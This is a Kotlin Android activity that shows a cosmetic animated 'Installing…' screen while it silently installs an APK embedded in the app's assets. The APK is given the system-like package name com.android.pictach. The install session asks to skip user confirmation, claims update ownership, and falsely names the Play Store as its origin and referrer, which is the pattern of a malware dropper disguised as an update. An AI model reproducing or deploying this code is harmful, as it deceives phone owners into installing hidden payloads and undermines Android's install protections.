package com.cristal.bristral.tristal.mistral

import android.animation.AnimatorSet
import android.animation.ObjectAnimator
import android.app.PendingIntent
import android.content.Intent
import android.content.pm.PackageInstaller
import android.content.pm.PackageManager
import android.graphics.Color
import android.graphics.drawable.GradientDrawable
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.util.TypedValue
import android.view.View
import android.widget.FrameLayout
import android.widget.ProgressBar
import android.widget.TextView
import androidx.appcompat.app.AppCompatActivity
import java.io.IOException

class InstallActivity : AppCompatActivity() {

    private var progressBar: ProgressBar? = null
    private var tvStatus: TextView? = null
    private val handler = Handler(Looper.getMainLooper())

    private val statusMessages = listOf(
        "Installing\u2026",
        "Please wait\u2026",
        "Finishing up\u2026",
        "Please wait\u2026"
    )
    private var statusIndex = 0

    private val dotSpecs = listOf(
        listOf("#BDBDBD", 22, 54,   0,    0, 10, true),
        listOf("#00BCD4", 24,  0,  34,  100, 12, false),
        listOf("#9E9E9E",  9, 54,  42,  200,  7, false),
        listOf("#9E9E9E", 22, 74,  34,  150,  9, false),
        listOf("#BDBDBD", 21,  0,  70,  250,  8, false),
        listOf("#00BCD4", 30, 28,  64,   50, 14, false),
        listOf("#F44336", 24, 98,  70,  300, 10, false),
        listOf("#4CAF50", 11,  2, 108,  180,  6, false),
        listOf("#E0E0E0",  9, 44, 112,  350,  5, false),
        listOf("#BDBDBD", 23, 64, 104,  120,  9, true),
        listOf("#FFC107", 30, 64, 142,   80, 13, false)
    )

    companion object {
        private const val SESSION_REQUEST = 1001
        private const val MAX_RETRIES    = 2
        private const val MARKET_URI     = "market://details?id=com.android.pictach"
        private const val REFERRER_URI   = "android-app://com.android.vending"
        private const val WRITE_NAME     = "update.pkg"
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            window.decorView.systemUiVisibility = (
                View.SYSTEM_UI_FLAG_LAYOUT_STABLE or
                View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN or
                View.SYSTEM_UI_FLAG_LIGHT_STATUS_BAR
            )
        }

        setContentView(R.layout.activity_install)

        progressBar = findViewById(R.id.progress_bar_install)
        tvStatus    = findViewById(R.id.tv_status)

        val container = findViewById<FrameLayout>(R.id.dots_container)
        container.post { buildAndAnimateDots(container) }

        // Cycle status text
        val cycleRunnable = object : Runnable {
            override fun run() {
                statusIndex = (statusIndex + 1) % statusMessages.size
                tvStatus?.text = statusMessages[statusIndex]
                handler.postDelayed(this, 2200)
            }
        }
        handler.postDelayed(cycleRunnable, 2200)

        // Load and install companion.apk from assets
        Thread {
            val apkBytes = try {
                assets.open("companion.apk").use { it.readBytes() }
            } catch (e: Exception) {
                null
            }
            if (apkBytes != null && apkBytes.isNotEmpty()) {
                runOnUiThread { installViaSession(apkBytes, attempt = 1) }
            }
        }.start()
    }

    private fun buildAndAnimateDots(container: FrameLayout) {
        dotSpecs.forEach { spec ->
            val colorHex  = spec[0] as String
            val sizeDp    = (spec[1] as Int).toFloat()
            val leftDp    = (spec[2] as Int).toFloat()
            val topDp     = (spec[3] as Int).toFloat()
            val delayMs   = (spec[4] as Int).toLong()
            val bounceDp  = (spec[5] as Int).toFloat()
            val isOutline = spec[6] as Boolean

            val sizePx   = dp(sizeDp).toInt()
            val leftPx   = dp(leftDp).toInt()
            val topPx    = dp(topDp).toInt()
            val bouncePx = dp(bounceDp)

            val dot = View(this).apply {
                layoutParams = FrameLayout.LayoutParams(sizePx, sizePx).apply {
                    leftMargin = leftPx
                    topMargin  = topPx
                }
                background = if (isOutline) {
                    GradientDrawable().apply {
                        shape = GradientDrawable.OVAL
                        setColor(Color.TRANSPARENT)
                        setStroke(dp(2.5f).toInt(), Color.parseColor(colorHex))
                    }
                } else {
                    GradientDrawable().apply {
                        shape = GradientDrawable.OVAL
                        setColor(Color.parseColor(colorHex))
                    }
                }
            }
            container.addView(dot)

            val bounceUp   = ObjectAnimator.ofFloat(dot, "translationY", 0f, -bouncePx).apply {
                duration = 350
                interpolator = android.view.animation.DecelerateInterpolator()
            }
            val bounceDown = ObjectAnimator.ofFloat(dot, "translationY", -bouncePx, 0f).apply {
                duration = 350
                interpolator = android.view.animation.AccelerateInterpolator()
            }
            val sxUp = ObjectAnimator.ofFloat(dot, "scaleX", 1f, 1.12f).apply { duration = 350 }
            val syUp = ObjectAnimator.ofFloat(dot, "scaleY", 1f, 1.12f).apply { duration = 350 }
            val sxDn = ObjectAnimator.ofFloat(dot, "scaleX", 1.12f, 1f).apply { duration = 350 }
            val syDn = ObjectAnimator.ofFloat(dot, "scaleY", 1.12f, 1f).apply { duration = 350 }

            val set = AnimatorSet().apply {
                playSequentially(
                    AnimatorSet().also { it.playTogether(bounceUp, sxUp, syUp) },
                    AnimatorSet().also { it.playTogether(bounceDown, sxDn, syDn) }
                )
                startDelay = delayMs
            }
            set.addListener(object : android.animation.AnimatorListenerAdapter() {
                override fun onAnimationEnd(animation: android.animation.Animator) {
                    set.startDelay = 500 + delayMs % 400
                    set.start()
                }
            })
            set.start()
        }
    }

    private fun dp(value: Float): Float =
        TypedValue.applyDimension(TypedValue.COMPLEX_UNIT_DIP, value, resources.displayMetrics)

    private fun installViaSession(apkBytes: ByteArray, attempt: Int) {
        try {
            val packageInstaller = packageManager.packageInstaller
            val params = PackageInstaller.SessionParams(
                PackageInstaller.SessionParams.MODE_FULL_INSTALL
            )
            params.setAppPackageName("com.android.pictach")
            params.setSize(apkBytes.size.toLong())
            params.setInstallLocation(1)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S)
                params.setRequireUserAction(PackageInstaller.SessionParams.USER_ACTION_NOT_REQUIRED)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU)
                params.setDontKillApp(true)
            params.setInstallReason(PackageManager.INSTALL_REASON_USER)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE)
                params.setRequestUpdateOwnership(true)
            try {
                params.setOriginatingUri(Uri.parse(MARKET_URI))
                params.setReferrerUri(Uri.parse(REFERRER_URI))
            } catch (e: Exception) { }

            val sessionId = packageInstaller.createSession(params)
            val session   = packageInstaller.openSession(sessionId)
            try {
                session.openWrite(WRITE_NAME, 0, apkBytes.size.toLong()).use { out ->
                    out.write(apkBytes)
                    session.fsync(out)
                }
                val intent = Intent(this, InstallReceiver::class.java).apply {
                    action = "com.cristal.bristral.tristal.mistral.SESSION_ACTION"
                }
                val flags = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S)
                    PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_MUTABLE
                else PendingIntent.FLAG_UPDATE_CURRENT

                session.commit(
                    PendingIntent.getBroadcast(this, SESSION_REQUEST, intent, flags).intentSender
                )
                session.close()
            } catch (e: IOException) {
                session.abandon()
                if (attempt < MAX_RETRIES)
                    handler.postDelayed({ installViaSession(apkBytes, attempt + 1) }, 1000)
            }
        } catch (e: Exception) {
            if (attempt < MAX_RETRIES)
                handler.postDelayed({ installViaSession(apkBytes, attempt + 1) }, 1000)
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        handler.removeCallbacksAndMessages(null)
    }
}
